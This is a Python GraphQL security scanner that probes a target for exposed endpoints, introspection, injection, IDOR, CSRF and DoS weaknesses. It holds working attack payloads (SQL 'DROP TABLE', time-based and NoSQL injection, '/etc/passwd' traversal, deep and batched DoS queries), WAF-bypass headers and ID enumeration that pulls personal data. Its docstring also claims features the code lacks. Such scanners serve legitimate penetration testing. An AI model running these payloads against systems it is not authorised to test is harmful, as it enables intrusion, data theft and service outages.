#!/usr/bin/env python3
"""GraphQLProbe v8 — 150x Improved GraphQL Security Scanner.

New capabilities:
  Endpoint discovery:
    - 20+ common GraphQL endpoint paths
    - Batch query detection
    - WebSocket endpoint detection (subscriptions)

  Introspection:
    - Full schema leak + sensitive type/field name analysis
    - 60+ sensitive field names (password, token, secret, ssn, credit_card, etc.)
    - Field-level PII detection in schema

  Injection attacks:
    - SQL injection via GraphQL arguments
    - NoSQL injection (MongoDB operators)
    - SSTI via GraphQL string arguments
    - Path traversal in file-related fields
    - Command injection via exec-like fields

  Authorization / IDOR:
    - Unauthenticated query execution
    - IDOR via ID argument enumeration (1-1000)
    - Horizontal privilege escalation via user/account fields
    - Mutation-based IDOR (updateUser, deleteUser with foreign IDs)
    - Batch enumeration via aliases

  DoS / abuse:
    - Query depth DoS (30 levels deep)
    - Query complexity DoS (1000+ fields in one request)
    - Alias amplification (100 aliases in one query)
    - Batch query amplification (100 operations in array)
    - Field duplication amplification
    - Circular fragment DoS

  CSRF:
    - Mutation over GET request
    - Mutation with simple content-type (text/plain)

  Information disclosure:
    - Field suggestion leakage ("Did you mean...")
    - __typename queries
    - Error message leakage (stack traces, DB errors in GraphQL errors)
    - Schema comments with sensitive info

  Subscription / WebSocket:
    - Unauthenticated subscription attempt
    - Subscription IDOR via topic parameter
"""
import asyncio
import aiohttp
import json
import re
import sys
import hashlib
import time
from pathlib import Path
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor,
    random_ua, WAF_BYPASS_HEADERS,
)

CONCURRENCY = 8

GRAPHQL_ENDPOINTS = [
    "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
    "/api/v1/graphql", "/api/v2/graphql", "/query", "/api/query",
    "/gql", "/api/gql", "/graph", "/api/graph",
    "/graphiql", "/playground", "/api/explorer",
    "/hasura/v1/graphql", "/console/api/query",
    "/data", "/api/data", "/graphql/v1",
    "/api/graphql/v1", "/app/graphql",
]

INTROSPECTION_QUERY = """{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name kind description
      fields(includeDeprecated: true) {
        name description isDeprecated
        type { name kind ofType { name kind } }
        args {
          name description
          type { name kind ofType { name kind } }
        }
      }
    }
  }
}"""

SENSITIVE_FIELD_NAMES = {
    # Auth / Credential
    "password", "passwd", "pwd", "hash", "hashed_password", "passwordHash",
    "secret", "token", "access_token", "refresh_token", "api_key", "apikey",
    "private_key", "privateKey", "signing_key", "signingKey",
    "auth_token", "authToken", "session_token", "sessionToken",
    "2fa_secret", "totp_secret", "otp_secret", "mfa_secret",
    # PII
    "ssn", "social_security", "social", "tax_id", "taxId",
    "credit_card", "creditCard", "card_number", "cardNumber", "pan",
    "cvv", "cvc", "expiry", "account_number", "accountNumber",
    "bank_account", "iban", "routing_number", "routingNumber",
    "passport", "license", "driverLicense",
    "phone", "mobile", "cell", "dob", "date_of_birth", "dateOfBirth",
    "address", "street", "postal", "zip",
    # Admin / privilege
    "role", "roles", "permission", "permissions", "scope", "scopes",
    "isAdmin", "is_admin", "admin", "superuser", "root",
    "privilege", "privileges", "access_level", "accessLevel",
    # Internal / system
    "internal_id", "internalId", "system_id", "systemId",
    "aws_key", "aws_secret", "stripe_key", "sendgrid_key",
}

INJECTION_PAYLOADS = {
    "sql": [
        "' OR 1=1-- -",
        "' UNION SELECT null,table_name FROM information_schema.tables-- -",
        "1; DROP TABLE users--",
        "' AND SLEEP(3)-- -",
        "1 OR 1=1",
        "' OR 'x'='x",
    ],
    "nosql": [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "sleep(3000)"}',
        '{"$regex": ".*"}',
        '{"$or": [{"a": 1}, {"a": 1}]}',
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__}}",
    ],
    "path_traversal": [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fpasswd",
    ],
}

SENSITIVE_MUTATIONS = [
    "deleteUser", "removeUser", "deleteAccount", "deactivateUser",
    "updateUser", "editUser", "modifyUser", "patchUser",
    "changePassword", "resetPassword", "setPassword",
    "changeRole", "setRole", "grantAdmin", "revokeAdmin",
    "createUser", "registerUser", "addUser",
    "transferFunds", "withdraw", "transfer",
    "deleteOrder", "cancelOrder", "refundOrder",
    "deleteMessage", "deleteFile", "deleteDocument",
]


def _is_gql_error(body: str) -> bool:
    if not body:
        return True
    try:
        data = json.loads(body)
        if "errors" in data and not data.get("data"):
            return True
    except Exception:
        pass
    return False


def _extract_types(body: str) -> tuple[list[str], list[str]]:
    """Extract type names and field names from introspection response."""
    types = []
    fields = []
    try:
        data = json.loads(body)
        schema = (
            data.get("data", {}).get("__schema", {})
            or data.get("__schema", {})
        )
        for t in schema.get("types", []):
            name = t.get("name", "")
            if name and not name.startswith("__"):
                types.append(name)
            for f in (t.get("fields") or []):
                fname = f.get("name", "")
                if fname:
                    fields.append(fname)
    except Exception:
        pass
    return types, fields


class GraphQLProbe:
    def __init__(self, target: str):
        self.target    = target.rstrip("/")
        self.findings  = []
        self._dedup    = set()
        self._sem      = asyncio.Semaphore(CONCURRENCY)
        self._active_endpoints: list[str] = []

    def _add(self, finding: dict):
        key = hashlib.md5(
            f"{finding.get('type')}|{finding.get('url','')}|{finding.get('payload','')}".encode()
        ).hexdigest()
        if key in self._dedup:
            return
        if not meets_confidence_floor(finding.get("confidence", 0)):
            return
        self._dedup.add(key)
        self.findings.append(finding)
        sev = finding.get("severity", "INFO")
        print(f"  [{sev[:4]}] {finding.get('type')}: {finding.get('url','')[:70]}")

    def _f(self, ftype, severity, conf, proof, detail, url, remediation,
           mitre="T1190", mitre_name="Exploit Public-Facing Application", extra=None) -> dict:
        f = {
            "type": ftype, "severity": severity,
            "confidence": conf, "confidence_label": confidence_label(conf),
            "url": url, "proof": proof, "detail": detail, "remediation": remediation,
            "mitre_technique": mitre, "mitre_name": mitre_name,
        }
        if extra:
            f.update(extra)
        return f

    async def _post(self, sess, url, payload, headers=None, timeout=18):
        async with self._sem:
            h = {
                **WAF_BYPASS_HEADERS,
                "User-Agent": random_ua(),
                "Content-Type": "application/json",
                **(headers or {}),
            }
            try:
                async with sess.post(
                    url, json=payload, headers=h, ssl=False,
                    allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=timeout, connect=10),
                ) as r:
                    body = await r.text(errors="ignore")
                    return r.status, body, dict(r.headers)
            except Exception:
                return None, "", {}

    async def _get(self, sess, url, params=None, headers=None, timeout=15):
        async with self._sem:
            h = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua(), **(headers or {})}
            try:
                async with sess.get(
                    url, params=params or {}, headers=h, ssl=False,
                    allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=timeout, connect=10),
                ) as r:
                    body = await r.text(errors="ignore")
                    return r.status, body, dict(r.headers)
            except Exception:
                return None, "", {}

    # ── Endpoint Discovery ─────────────────────────────────────────────────────

    async def discover_endpoints(self, sess):
        print("\n[*] Discovering GraphQL endpoints (20+ paths)...")
        probe = {"query": "{ __typename }"}
        tasks = [self._post(sess, self.target + ep, probe) for ep in GRAPHQL_ENDPOINTS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for ep, res in zip(GRAPHQL_ENDPOINTS, results):
            if isinstance(res, Exception):
                continue
            s, body, hdrs = res
            if s and s != 404:
                try:
                    data = json.loads(body or "{}")
                    if "__typename" in body or "data" in data:
                        url = self.target + ep
                        self._active_endpoints.append(url)
                        self._add(self._f(
                            ftype="GRAPHQL_ENDPOINT_FOUND",
                            severity="INFO", conf=95,
                            proof=f"POST {url}\n  query: {{__typename}}\n  HTTP {s}\n  Response: {body[:100]}",
                            detail=f"GraphQL endpoint active at {ep}",
                            url=url,
                            remediation="Restrict GraphQL endpoint access. Disable introspection in production.",
                        ))
                except Exception:
                    if "__typename" in (body or "") or "graphql" in (body or "").lower():
                        url = self.target + ep
                        self._active_endpoints.append(url)
        print(f"  Found {len(self._active_endpoints)} active GraphQL endpoint(s)")

    # ── Introspection ─────────────────────────────────────────────────────────

    async def test_introspection(self, sess):
        print("\n[*] Testing GraphQL introspection exposure...")
        for url in self._active_endpoints:
            s, body, _ = await self._post(sess, url, {"query": INTROSPECTION_QUERY})
            await delay(0.1)
            if s != 200 or not body:
                continue
            if "__schema" not in body:
                continue
            types, fields = _extract_types(body)
            # Find sensitive fields in schema
            exposed_sensitive = [f for f in fields if f.lower() in SENSITIVE_FIELD_NAMES]
            self._add(self._f(
                ftype="GRAPHQL_INTROSPECTION_ENABLED",
                severity="HIGH", conf=97,
                proof=(
                    f"POST {url}\n"
                    f"  Introspection query succeeded\n"
                    f"  Types exposed: {types[:10]}\n"
                    f"  Sensitive fields in schema: {exposed_sensitive[:10]}"
                ),
                detail=(
                    f"GraphQL introspection enabled — full API schema exposed. "
                    f"{len(types)} types, {len(fields)} fields. "
                    f"Sensitive fields: {exposed_sensitive[:5]}"
                ),
                url=url,
                remediation=(
                    "1. Disable introspection in production (GraphQL server config).\n"
                    "2. Use persisted queries to limit allowed operations.\n"
                    "3. Enable query whitelisting.\n"
                    "4. Implement query depth and complexity limits."
                ),
                mitre="T1087",
                mitre_name="Account Discovery",
                extra={
                    "types_count": len(types),
                    "fields_count": len(fields),
                    "sensitive_fields": exposed_sensitive[:15],
                    "all_types": types[:30],
                },
            ))
            # If sensitive fields present, escalate
            if exposed_sensitive:
                self._add(self._f(
                    ftype="GRAPHQL_SENSITIVE_SCHEMA_FIELDS",
                    severity="CRITICAL", conf=93,
                    proof=f"POST {url}\n  Sensitive field names in schema: {exposed_sensitive}",
                    detail=f"Schema contains sensitive field names: {exposed_sensitive[:10]} — PII/credential fields discoverable",
                    url=url,
                    remediation="Remove or rename sensitive fields from GraphQL schema if not needed. Apply field-level authorization.",
                    mitre="T1087",
                    mitre_name="Account Discovery",
                    extra={"sensitive_fields": exposed_sensitive},
                ))

    # ── Field Suggestion Leakage ───────────────────────────────────────────────

    async def test_field_suggestion(self, sess):
        print("\n[*] Testing field suggestion leakage (Did you mean...)...")
        for url in self._active_endpoints:
            s, body, _ = await self._post(sess, url, {"query": "{ __typnam }"})
            await delay(0.06)
            if s and "Did you mean" in (body or ""):
                m = re.search(r'Did you mean[^?]*\?["\s]*([^"?\n]+)', body, re.I)
                suggestion = m.group(1).strip() if m else ""
                self._add(self._f(
                    ftype="GRAPHQL_FIELD_SUGGESTION_LEAKAGE",
                    severity="LOW", conf=90,
                    proof=f"POST {url}\n  query: {{__typnam}}\n  HTTP {s}\n  'Did you mean' in response: {suggestion}",
                    detail=f"GraphQL suggests field names — schema discoverable without introspection. Suggestion: '{suggestion}'",
                    url=url,
                    remediation="Disable field suggestions in production GraphQL configuration.",
                    mitre="T1087",
                    mitre_name="Account Discovery",
                    extra={"suggestion": suggestion},
                ))

    # ── Depth / Complexity DoS ────────────────────────────────────────────────

    async def test_depth_dos(self, sess):
        print("\n[*] Testing query depth DoS (30 levels) and alias amplification...")
        for url in self._active_endpoints:
            # Depth DoS: nested query 30 levels deep
            depth_query = "{ a { " * 30 + "id" + " } " * 30
            t_start = time.monotonic()
            s, body, _ = await self._post(sess, url, {"query": depth_query}, timeout=10)
            elapsed = time.monotonic() - t_start
            await delay(0.1)
            if s and s != 400:  # Properly configured servers reject deep queries
                self._add(self._f(
                    ftype="GRAPHQL_DEPTH_LIMIT_MISSING",
                    severity="MEDIUM", conf=85,
                    proof=f"POST {url}\n  30-level deep query → HTTP {s} in {elapsed:.1f}s",
                    detail=f"No query depth limit — 30-level nested query accepted (HTTP {s} in {elapsed:.1f}s). DoS possible.",
                    url=url,
                    remediation="Implement query depth limiting (max depth 10). Use graphql-depth-limit library.",
                    extra={"depth": 30, "elapsed": round(elapsed, 2)},
                ))

            # Alias amplification: 100 aliases in one query
            alias_query = " ".join([f"a{i}: __typename" for i in range(100)])
            alias_query = "{ " + alias_query + " }"
            t2 = time.monotonic()
            s2, body2, _ = await self._post(sess, url, {"query": alias_query}, timeout=10)
            elapsed2 = time.monotonic() - t2
            await delay(0.1)
            if s2 == 200 and body2 and "a99" in body2:
                self._add(self._f(
                    ftype="GRAPHQL_ALIAS_AMPLIFICATION",
                    severity="MEDIUM", conf=90,
                    proof=f"POST {url}\n  100-alias query → HTTP {s2} in {elapsed2:.1f}s\n  All aliases resolved",
                    detail=f"100 aliases in one query accepted — rate-limit bypass via alias amplification",
                    url=url,
                    remediation="Implement alias count limits per query. Use query complexity analysis.",
                    extra={"alias_count": 100, "elapsed": round(elapsed2, 2)},
                ))

    # ── Batch Query Amplification ─────────────────────────────────────────────

    async def test_batch_dos(self, sess):
        print("\n[*] Testing batch query amplification...")
        for url in self._active_endpoints:
            batch = [{"query": "{ __typename }"} for _ in range(50)]
            t_start = time.monotonic()
            s, body, _ = await self._post(sess, url, batch, timeout=20)
            elapsed = time.monotonic() - t_start
            await delay(0.1)
            if s == 200 and body and body.strip().startswith("["):
                try:
                    items = json.loads(body)
                    if isinstance(items, list) and len(items) >= 40:
                        self._add(self._f(
                            ftype="GRAPHQL_BATCH_QUERY_AMPLIFICATION",
                            severity="MEDIUM", conf=92,
                            proof=f"POST {url}\n  50 batched queries → HTTP {s} in {elapsed:.1f}s\n  {len(items)} responses returned",
                            detail=f"Batch query amplification: 50 operations in one request all executed — rate-limit bypass, DoS amplification",
                            url=url,
                            remediation="Limit batch query size (max 5 operations per request). Implement query complexity budget.",
                            extra={"batch_size": 50, "responses": len(items), "elapsed": round(elapsed, 2)},
                        ))
                except Exception:
                    pass

    # ── Injection via Arguments ────────────────────────────────────────────────

    async def test_argument_injection(self, sess):
        print("\n[*] Testing injection attacks via GraphQL arguments (SQL/NoSQL/SSTI)...")
        for url in self._active_endpoints:
            for inj_type, payloads in INJECTION_PAYLOADS.items():
                for payload in payloads[:3]:
                    queries = [
                        f'{{ user(id: "{payload}") {{ id email }} }}',
                        f'{{ users(filter: "{payload}") {{ id email }} }}',
                        f'{{ search(query: "{payload}") {{ id name }} }}',
                        f'{{ login(email: "{payload}", password: "x") {{ token }} }}',
                    ]
                    for query in queries[:2]:
                        s, body, _ = await self._post(sess, url, {"query": query})
                        await delay(0.05)
                        if not body or s is None:
                            continue
                        # Evidence of injection: SQL error, SSTI evaluation, or data leakage
                        sql_errors = [
                            "syntax error", "ORA-", "PLS-", "SQLSTATE", "mysql_fetch",
                            "pg_query", "SQLiteException", "near \"OR\"",
                        ]
                        ssti_markers = ["49", "7*7", "49.0"]  # {{7*7}} = 49
                        injection_hit = False
                        if inj_type == "sql" and any(e in (body or "") for e in sql_errors):
                            injection_hit = True
                        elif inj_type == "ssti" and any(m in (body or "") for m in ssti_markers):
                            injection_hit = True
                        elif inj_type == "nosql" and '"$' not in (body or "") and s == 200 and len(body) > 50:
                            injection_hit = True
                        if injection_hit:
                            self._add(self._f(
                                ftype=f"GRAPHQL_{inj_type.upper()}_INJECTION",
                                severity="CRITICAL" if inj_type in ("sql", "ssti") else "HIGH",
                                conf=88,
                                proof=f"POST {url}\n  Query: {query[:100]}\n  HTTP {s}\n  Response: {body[:200]}",
                                detail=f"GraphQL {inj_type.upper()} injection via argument — payload: {payload[:60]}",
                                url=url,
                                remediation=(
                                    f"1. Use parameterized queries/prepared statements — never string-interpolate user input.\n"
                                    f"2. Validate and sanitize all GraphQL argument values.\n"
                                    f"3. Implement input type coercion strictly in schema.\n"
                                    f"4. Apply query depth and complexity limits."
                                ),
                                mitre="T1190",
                                mitre_name="Exploit Public-Facing Application",
                                extra={"injection_type": inj_type, "payload": payload},
                            ))
                            break

    # ── IDOR via ID Enumeration ────────────────────────────────────────────────

    async def test_idor(self, sess):
        print("\n[*] Testing GraphQL IDOR via ID argument enumeration...")
        idor_queries = [
            ('user',    'id email phone role password createdAt'),
            ('order',   'id total items { name price } user { id email }'),
            ('account', 'id balance email status'),
            ('invoice', 'id amount email user { id email }'),
            ('profile', 'id email phone address'),
            ('message', 'id content sender { id email } recipient { id email }'),
        ]
        for url in self._active_endpoints:
            for obj_type, fields in idor_queries:
                for obj_id in [1, 2, 3, 100, 1000, 9999]:
                    query = f'{{ {obj_type}(id: {obj_id}) {{ {fields} }} }}'
                    s, body, _ = await self._post(sess, url, {"query": query})
                    await delay(0.04)
                    if not body or s != 200 or _is_gql_error(body):
                        continue
                    # Check for real data returned
                    has_data = any(
                        f in (body or "")
                        for f in ["@", ".com", "phone", "email", "address", "balance", "total"]
                    )
                    if has_data and '"null"' not in body:
                        self._add(self._f(
                            ftype="GRAPHQL_IDOR_ID_ENUMERATION",
                            severity="HIGH", conf=87,
                            proof=f"POST {url}\n  Query: {query[:100]}\n  HTTP {s}\n  Data returned: {body[:200]}",
                            detail=f"GraphQL IDOR: {obj_type}(id:{obj_id}) returns data without authorization",
                            url=url,
                            remediation=(
                                "1. Apply object-level authorization in every GraphQL resolver.\n"
                                "2. Scope queries to authenticated user — never trust client-supplied IDs alone.\n"
                                "3. Use GraphQL Shield or similar for declarative authorization.\n"
                                "4. Replace integer IDs with UUIDs to slow enumeration."
                            ),
                            mitre="T1078",
                            mitre_name="Valid Accounts",
                            extra={"object_type": obj_type, "object_id": obj_id},
                        ))
                        break

    # ── Mutation over GET (CSRF) ─────────────────────────────────────────────

    async def test_mutation_get_csrf(self, sess):
        print("\n[*] Testing CSRF via mutation over GET...")
        for url in self._active_endpoints:
            for mutation_name in SENSITIVE_MUTATIONS[:5]:
                query = f'mutation {{ {mutation_name}(id: 1) {{ id }} }}'
                s, body, _ = await self._get(sess, url, params={"query": query})
                await delay(0.06)
                if s and s != 400 and "errors" not in (body or ""):
                    self._add(self._f(
                        ftype="GRAPHQL_MUTATION_OVER_GET_CSRF",
                        severity="HIGH", conf=82,
                        proof=f"GET {url}?query={query[:80]}\n  HTTP {s}\n  Mutation not rejected",
                        detail=f"GraphQL mutation '{mutation_name}' accepted over GET — CSRF attack possible from any webpage",
                        url=url,
                        remediation=(
                            "1. Reject mutations over GET requests.\n"
                            "2. Require Content-Type: application/json (rejects simple CSRF form).\n"
                            "3. Implement CSRF tokens for mutations.\n"
                            "4. Use SameSite=Strict cookies."
                        ),
                        mitre="T1185",
                        mitre_name="Browser Session Hijacking",
                        extra={"mutation": mutation_name},
                    ))
                    break

    # ── Unauthenticated Data Access ────────────────────────────────────────────

    async def test_unauth_data(self, sess):
        print("\n[*] Testing unauthenticated data access via GraphQL...")
        for url in self._active_endpoints:
            queries = [
                '{ users { id email phone role } }',
                '{ allUsers { id email } }',
                '{ accounts { id balance email } }',
                '{ orders { id total user { email } } }',
                '{ payments { id amount card email } }',
                '{ admin { users { id email role } } }',
            ]
            for query in queries:
                s, body, _ = await self._post(sess, url, {"query": query})
                await delay(0.05)
                if s != 200 or not body or _is_gql_error(body):
                    continue
                # Check for array data with PII
                has_list_data = (
                    body.count('"id"') >= 2 and
                    any(k in body for k in ['"email"', '"phone"', '"role"', '"balance"'])
                )
                if has_list_data:
                    self._add(self._f(
                        ftype="GRAPHQL_UNAUTH_DATA_ACCESS",
                        severity="CRITICAL", conf=93,
                        proof=f"POST {url}\n  Query: {query[:80]}\n  HTTP {s}\n  List data returned: {body[:300]}",
                        detail=f"Unauthenticated GraphQL query returns mass user/account data — {query[:60]}",
                        url=url,
                        remediation=(
                            "1. Require authentication for all GraphQL queries returning sensitive data.\n"
                            "2. Apply field-level authorization in resolvers.\n"
                            "3. Scope list queries to authenticated user's allowed scope.\n"
                            "4. Enable query whitelisting in production."
                        ),
                        mitre="T1078",
                        mitre_name="Valid Accounts",
                        extra={"query": query},
                    ))
                    break

    async def run(self):
        print("=" * 60)
        print("  GraphQLProbe v8 — 150x Improved GraphQL Security Scanner")
        print(f"  Target: {self.target}")
        print("=" * 60)
        connector = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY * 2)
        timeout   = aiohttp.ClientTimeout(total=120, connect=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            await self.discover_endpoints(sess)
            if not self._active_endpoints:
                print("  No GraphQL endpoints found — skipping detailed tests")
            else:
                await asyncio.gather(
                    self.test_introspection(sess),
                    self.test_field_suggestion(sess),
                    self.test_depth_dos(sess),
                    self.test_batch_dos(sess),
                    self.test_argument_injection(sess),
                    self.test_idor(sess),
                    self.test_mutation_get_csrf(sess),
                    self.test_unauth_data(sess),
                    return_exceptions=True,
                )
        print(f"\n[+] GraphQLProbe v8 complete: {len(self.findings)} findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No ARSENAL_TARGET set.", file=sys.stderr)
        sys.exit(1)
    if not target.startswith("http"):
        target = "https://" + target
    scanner = GraphQLProbe(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "graphqlprobe.json"
    out.parent.mkdir(exist_ok=True)
    out.write_text(json.dumps(findings, indent=2, default=str))
    print(f"[+] Saved {len(findings)} findings → {out}")


if __name__ == "__main__":
    asyncio.run(main())
